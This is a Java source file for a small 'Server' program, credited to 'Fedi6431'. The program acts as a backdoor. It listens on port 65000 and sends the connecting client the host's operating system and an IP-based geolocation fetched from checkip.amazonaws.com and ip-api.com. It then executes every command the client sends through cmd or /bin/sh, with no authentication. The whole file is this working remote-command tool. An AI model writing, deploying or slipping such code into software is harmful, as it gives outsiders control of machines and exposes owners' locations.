//This software is protected by Fedi6431© copyrights
import java.io.*;
import java.net.*;

public class Server {
    // Method to initialize the server with the given address and port
    public static void initialize(String address, int port) {
        try (ServerSocket server = new ServerSocket(port)) {
            System.out.println("Server started on port " + port + ", address: " + address);

            try (Socket clientSocket = server.accept()) {
                System.out.println("\nClient connected\n");

                DataInputStream input = new DataInputStream(new BufferedInputStream(clientSocket.getInputStream()));
                PrintWriter output = new PrintWriter(clientSocket.getOutputStream(), true);

                // Get the operating system name and send it to the client
                String os = System.getProperty("os.name");
                output.println(os);

                // Get geolocation information and send it to the client
                String geoLocation = getGeoLocation();
                output.println(geoLocation);

                String line = "";
                // Receive commands from the client and execute them based on the operating system
                while (!line.equalsIgnoreCase("exit")) {
                    line = input.readUTF();
                    System.out.println(line);

                    Process process;
                    if (os.toLowerCase().contains("windows")) {
                        process = Runtime.getRuntime().exec(new String[]{"cmd", "/c", line});
                    } else {
                        process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", line});
                    }

                    process.waitFor();
                }
            } catch (IOException | InterruptedException e) {
                System.out.println("Oops.. Something went wrong.");
                System.out.println("Exception: " + e.getMessage());
                System.exit(2);
            }

            System.out.println("Server shutting down");
        } catch (IOException e) {
            System.out.println("IO exception: " + e.getMessage());
            System.exit(2);
        }
    }

    // Method to fetch geolocation information
    public static String getGeoLocation() throws IOException {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
                String ip = in.readLine();

                URL ipapi = new URL("http://ip-api.com/json/" + ip);
                URLConnection c = ipapi.openConnection();

                try (BufferedReader reader = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                    StringBuilder geoInfo = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        geoInfo.append(line);
                    }
                    return geoInfo.toString();
                }
            } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    // Main method to start the server
    public static void main(String[] args) {
        try {
            InetAddress localIpAddress = InetAddress.getLocalHost();
            String address = localIpAddress.getHostAddress();
            initialize(address, 65000);
        } catch (UnknownHostException e) {
            System.out.println("Error getting local host address: " + e.getMessage());
            System.exit(2);
        }
    }
}

